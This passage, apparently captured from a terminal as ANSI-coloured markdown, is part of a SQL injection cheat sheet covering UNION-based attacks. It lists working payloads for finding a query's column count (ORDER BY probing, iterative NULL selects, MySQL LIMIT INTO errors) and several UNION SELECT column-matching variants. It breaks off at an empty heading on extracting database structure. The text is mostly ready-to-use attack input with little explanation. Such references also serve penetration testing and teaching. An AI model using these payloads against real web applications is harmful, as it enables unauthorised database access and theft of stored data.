[34m│[0m ### UNION-Based Injection                                                    [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Column Count Detection:**                                                  [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **ORDER BY Method:**                                                         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ' ORDER BY 1-- (works)                                                       [34m│[0m
[34m│[0m ' ORDER BY 2-- (works)                                                       [34m│[0m
[34m│[0m ' ORDER BY 3-- (error = 2 columns)                                           [34m│[0m
[34m│[0m THEN: ' UNION SELECT null,null--                                             [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Iterative NULL Method:**                                                   [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m UNION SELECT NULL--                                                          [34m│[0m
[34m│[0m UNION SELECT NULL, NULL--                                                    [34m│[0m
[34m│[0m UNION SELECT NULL, NULL, NULL--                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **LIMIT INTO Method (MySQL, when error reporting enabled):**                 [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m 1' LIMIT 1,1 INTO @--+ (error)                                               [34m│[0m
[34m│[0m 1' LIMIT 1,1 INTO @,@--+ (error)                                             [34m│[0m
[34m│[0m 1' LIMIT 1,1 INTO @,@,@--+ (no error = 3 columns)                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **UNION Column Matching:**                                                   [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m UNION SELECT 1,2,3                                                           [34m│[0m
[34m│[0m UNION SELECT null,null,null                                                  [34m│[0m
[34m│[0m UNION ALL SELECT 1,2,3                                                       [34m│[0m
[34m│[0m UNION SELECT *FROM(SELECT 1)a JOIN(SELECT 2)b JOIN(SELECT 3)c...             [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Extract Database Structure:**                                              [34m│[0m
[34m│[0m                                                                              [34m│[0m
